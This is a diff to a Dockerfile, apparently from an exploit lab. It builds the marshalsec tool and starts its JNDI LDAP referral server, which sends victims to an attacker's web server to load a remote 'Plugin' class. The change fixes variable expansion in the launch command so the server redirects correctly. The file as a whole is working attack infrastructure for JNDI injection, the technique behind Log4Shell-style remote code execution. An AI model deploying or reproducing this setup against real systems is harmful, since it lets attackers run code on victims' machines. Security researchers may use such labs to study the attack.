@@ -5,11 +5,11 @@ COPY marshalsec/ /marshalsec
 WORKDIR /marshalsec
 RUN mvn package -DskipTests
 
-ARG VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME
-ARG VICTIM_TO_ATTACKER_HTTP_PORT
+ENV VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME=$VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME
+ENV VICTIM_TO_ATTACKER_HTTP_PORT=$VICTIM_TO_ATTACKER_HTTP_PORT
 
 # sleep 5 for race condition
 RUN sleep 5
 
 # Make marshalsec's LDAP server to redirect the client to the attacker web server
-CMD ["java", "-cp", "/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer" ,"http://${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}:${VICTIM_TO_ATTACKER_HTTP_PORT}/#Plugin", "1389"]
+CMD ["sh", "-c", "java -cp /marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}:${VICTIM_TO_ATTACKER_HTTP_PORT}/#Plugin 1389"]
